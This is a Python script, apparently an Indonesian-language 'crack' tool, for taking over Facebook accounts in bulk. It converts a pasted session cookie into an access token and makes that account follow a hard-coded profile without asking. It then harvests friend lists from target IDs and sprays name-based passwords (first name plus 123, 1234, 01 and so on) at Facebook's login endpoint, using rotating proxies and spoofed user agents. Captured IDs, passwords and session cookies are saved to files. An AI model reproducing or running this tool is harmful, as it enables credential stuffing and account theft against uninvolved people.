#/usr/bin/python/#
#github.com/fahrukate#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from time import time as tere
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from datetime import datetime

try:
        import rich
except ImportError:
        print('>> Sedang Menginstall Modul Rich <<')
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        print('>> Sedang Menginstall Modul Stdiomask <<')
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	print('>> Sedang Menginstall Modul Requests & Mechanize <<')
	os.system('pip install requests && pip install mechanize ')

pretty.install()
CON=sol()
cokbrut=[]
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
pwpluss,pwnya=[],[]
ses=requests.Session()
princp=[]
sys.stdout.write('\x1b]2; (Simpel Tools) \x07')
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mJaringan Internet Anda Bermasalah')
prox=open('.prox.txt','r').read().splitlines()

sir = '\033[41m\x1b[1;97m'
S = '\x1b[0;00m'
I = '\x1b[0;32m'
C = '\x1b[0;36m'
Q = '\x1b[00m'
ff = '\x1b[0;36m'
G = '\x1b[0;36m'
i = '\x1b[0;32m'
mm = '\x1b[0;36m'
R = '\x1b[0;36m'
W = '\x1b[0;00m'
c = '\x1b[0;32m'
o = '\x1b[0;31m'
T = '\x1b[1;94m'
E = '\033[38;2;255;127;0;1m'
HA = '\x1b[0;32m'
KU = '\x1b[0;33m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m'
b = '\33[1;96m'
p = '\x1b[0;34m'
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T,P,p,S,I,C,Q,ff,G,i,mm,R,W,c,o,KU,HA])

nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
okc = f"OK-{days}-{reall}-{year}.txt"
cpc = f"CP-{days}-{reall}-{year}.txt"

def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Sore"
	else:timenow = "Selamat Malam"
	return timenow

def coli(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
def clear():
	os.system('clear')
def back():
	login()

def banner():
	print(f'''{sir}>>[=]<<''')

def login():
	try:
		token = open('token.txt','r').read()
		cok = open('cookie.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# Problem Internet Connection, Check And Try Again'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		clear()
		cok = input(f' [!] masukan cookie : ')
		cos = {'cookie':cok}; data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}; req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json(); cd   = req['code']; ucd  = req['user_code']; url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req  = parser(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq  = req.find('form',{'method':'post'}); dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}; rel  = 'https://mbasic.facebook.com' + raq['action']; pos  = parser(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
		dat  = {}
		raq  = pos.find('form',{'method':'post'})
		for x in raq('input',{'value':True}):
			try:
				if x['name'] == '__CANCEL__':
					pass
				else:
					dat.update({x['name']:x['value']})
			except Exception as e:
				pass
		rel = 'https://mbasic.facebook.com' + raq['action']; pos = parser(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req = ses.get(url,cookies=cos).json(); tok = req['access_token']; kot = open('token.txt','w').write(tok); koc = open('cookie.txt','w').write(cok); print(f'{P} [!] Login Sukses');follow()
		
	except Exception as e:
		print(f'{M}{str(e)}');exit()
def follow():
	try:
		token = open('token.txt','r').read()
		cokies = open('cookie.txt','r').read()
	except IOError:
		print('└─Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	myuid = ('100025406916422')
	try:
		for foll in parser(requests.get(f'https://mbasic.facebook.com/'+myuid,cookies={'cookie':cokies}).text,'html.parser').find_all('a',href=True):
			if '/a/subscribe.php?' in foll.get('href'):
				x=requests.get('https://mbasic.facebook.com'+foll['href'],cookies = {'cookie':cokies}).text
				exit()
	except(Exception)as e:print(e)#< Response error
def menu(my_name,my_id):
	try:
		token = open('token.txt','r').read();cok = open('cookie.txt','r').read()
	except IOError:
		print(f'[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	clear()
	
	print(f'{P}# {ewe}{waktu()} {H}%s {P}#'%(my_name))
	#print(f'{B}[{J}>{B}] {A}Simpel Tools Version {H}6.1 {B}[{J}<{B}]')
	print(f"{x}-" *40)
	print(f'{B}[{J}1{B}] {P}Crack Publik\n{B}[{J}2{B}] {P}Hasil Crack')
	_____memek_____ = input(f' └──Pilih : ')
	if _____memek_____ in ['1']:
		dump_massal()
	elif _____memek_____ in ['2']:
		result()
	elif _____memek_____ in ['']:
		error()
	else:
		print(f' {P}└─{J} pilih yang benar ')
		back()
def error():
	print(f' {P}└─{J} error in selecting features')
	time.sleep(4)
	back()
def result():
	clear()
	print(f"{x}-" *40)
	print(f'{B}[{J}01{B}] {P}Hasil {h}OK{x} Anda ')
	print(f'{B}[{J}02{B}] {P}Hasil {k}CP{x} Anda ')
	kz = input(f' └── Pilih : ')
	if kz in ['02','2']:
		print(f"{x}-" *40)
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f' {P}└─{J} file tidak di temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f' {P}└─{J} anda tidak memiliki hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[0%s] %s {K}%s {x}Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+f' {K}'+str(len(hem))+f' {x}Account'+x)
			geeh = input(f' └── Pilih : ')
			print(f"{x}-" *40)
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}└─{J} pilih yang benar...')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f' {P}└─{J} file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {K}{cpkuni[0]}{P}│{K}{cpkuni[1]}')
				nocp +=1
			print(f"{x}-" *40)
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['01','1']:
		print(f"{x}-" *40)
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f' {P}└─{J} file tidak di temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' {P}└─{J} anda tidak mempunyai fileOK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s] %s {H}%s{x} Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[%s] %s {H} %s {x}Account'%(cih,isi,(len(hem))))
			geeh = input(f' └── Pilih : ')
			print(f"{x}-" *40)
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}└─{J} pilih yang bener kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f' {P}└─{J} file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {h}{cpkuni[0]}{P}│{H}{cpkuni[1]}{P}│{h}{cpkuni[2]}{x}')
				nocp +=1
			print(f"{x}-" *40)
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print(f' {P}└─{J} pilih yang bener kontol ')
		back()
def dump_massal():
	try:
		token = open('token.txt','r').read();cok = open('cookie.txt','r').read()
	except IOError:
	    exit(f' {P}└─{J} cookies expired')
	try:
		print(f"{x}-" *40)
		kumpulkan = int(input(f'{B}[{J}●{B}] {P}input target amount ? :{b} '))
	except ValueError:
	    exit(f' {P}└─{J} wrong input ')
	if kumpulkan<1 or kumpulkan>1000:
	    exit(f' {P}└─{J} the amount you entered exceeds the limit ')
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'{B}[{J}>{B}] {P}enter the id '+str(bilangan)+f' : {b}')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit(f" {P}└─{J} unstable signal ")
	try:
	      print(f'{B}[{J}!{B}] {P}total id collected : {h}'+str(len(id)))
	      atur_id()
	except requests.exceptions.ConnectionError:
	    exit(f" {P}└─{J} gagal dump")
	except (KeyError,IOError):
		exit(f" {P}└─{J} friendship not public {x}")		        
def atur_id():
	if len(id)==0:
		exit(f' {P}└─{J} uid tidak publik')
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)
#	print(f"{x}-" *40)
#	pwplus=input(f'{B}[{J}?{B}] {P}add password manual? (y│t) : {b}')
#	if pwplus in ['y','Y']:
#		pwpluss.append('ya')
#		pwku=input(f'{P} └─ {b}')
#		pwkuh=pwku.split(',')
#		for xpw in pwkuh:
#			pwnya.append(xpw)
#	else:
#		pwpluss.append('no')
	passwrd()

def passwrd():
	print(f"{x}-" *40)
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
					pwv.append(frs+'06')
					pwv.append(frs+'07')
					pwv.append(frs+'09')
					pwv.append(frs+'12')
					pwv.append(frs+'21')
					pwv.append(frs+'234')
					pwv.append(frs+'321')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'crack' in method:
				pool.submit(crack,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print()
	print('-'*40)
	print(f'\r{A}[{ewe}±{A}] {P}crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')

def UserAgent():
	a = random.choice(["in-id","uk-ua","ms-my","my-zg","en-us","'en-gb","id-id","de-de","ru-ru","en-sg","fr-fr","fa-ir","ja-jp","pt-br","cs-cz","zh-hk","zh-cn","vi-vn","en-ph","en-in","tr-tr","en-au","th-th","hi-in","zh-tw"])
	b = random.choice(["UWC27C","CWM38X","SCB20W","JJA16B","EEN60M","AIB13U","EPO72C","BLU81S","QFO64L","ZEE14N","GIN65T","OFQ75I","TAW20K","WBI97A","WSZ38B","OPB63C","LIJ14A","SPN18U","N6F26Q","NBK39Q","QWB40G","MLW15E","LRX22C","GWK74","R16NW","FROYO","JZO54K","JSS15J","GRWK74","KOT49H","MMB29M","IMM76D","KTU84P","JDQ39","LMY47X","NMF26X","M1AJQ","GINGERBREAD"])
	c = f"Mozilla/5.0 (Linux; U; Android {str(random.randint(6,14))}; {a}; OPPO A{str(random.randint(30,60))} Build/{b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,117))}.0.{str(random.randint(2500,5900))}.{str(random.randint(80,200))} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(6,47))}.{str(random.randint(7,8))}.{str(random.randint(2,40))}.{str(random.randint(1,9))}"
	return c

def crack(idf,pwv):
	global loop,ok,cp
	ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T,P,p,b,S,I,C,Q,ff,G,i,mm,R,W,c,o,KU,HA])
	sys.stdout.write(f"\r{P}{len(id)}│{ewe}{loop}{P} Ok:{H}{ok} {P}Cp:{K}{cp}{x} "),
	sys.stdout.flush()
	ua = UserAgent()
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxies= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			link = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fclient_id%3D482073673212185%26state%3D2916998a1f449ba3ee9407b085e05c4c%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3D%252F%252Fwww.kilat.com%252Ffb-callback%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De0e798ae-ef69-48de-a514-1612484d66b2%26tp%3Dunspecified&cancel_url=%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2916998a1f449ba3ee9407b085e05c4c%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			data = {
			'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),
			'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
			'uid': idf,
			'next': 'https://m.facebook.com/v3.2/dialog/oauth?client_id=482073673212185&state=f51b694bdb918f8ade856ee4124d5aa7&tp=unspecified',
			'flow': 'login_no_pin',
			'encpass': f"#PWD_BROWSER:0:{str(tere()).split('.')[0]}:{pw}",}
			headers = {
			'Host': 'm.facebook.com',
			'cache-control': 'max-age=0',
			'content-length': '2435',
			'scheme': 'https',
			'sec-ch-ua': '"Chromium";v="{}", "Google Chrome";v="{}", "Not;A=Brand";v="99"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'upgrade-insecure-requests': '1',
			'origin': 'https://m.facebook.com',
			'content-type': 'text/html; charset=utf-8',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'x-requested-with': 'XMLHttpRequest',
			'x-response-format': 'JSONStream',
			'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'cors',
			'sec-fetch-dest': 'empty',
			'content-type': 'application/x-www-form-urlencoded',
			'referer': f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fclient_id%3D482073673212185%26state%3D2916998a1f449ba3ee9407b085e05c4c%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3D%252F%252Fwww.kilat.com%252Ffb-callback%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De0e798ae-ef69-48de-a514-1612484d66b2%26tp%3Dunspecified&cancel_url=%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2916998a1f449ba3ee9407b085e05c4c%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'path': '/login/async/wvdp/',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'id-ID,id;q=0.9,en-US,en;q=0.9'}
			response = ses.post(f"https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID", data = data, headers = headers, allow_redirects=False,proxies=proxies)
			if 'c_user' in ses.cookies.get_dict():
				cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P} ✶ ━━━⫸ {H}{idf}{P}│{H}{pw}{P}│{H}{cookie}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+cookie+'\n')
				ok+=1
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print(f'\r{P} ✶ ━━━⫸ {K}{idf}{P}│{K}{pw}{N}')
				cp+=1
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login()
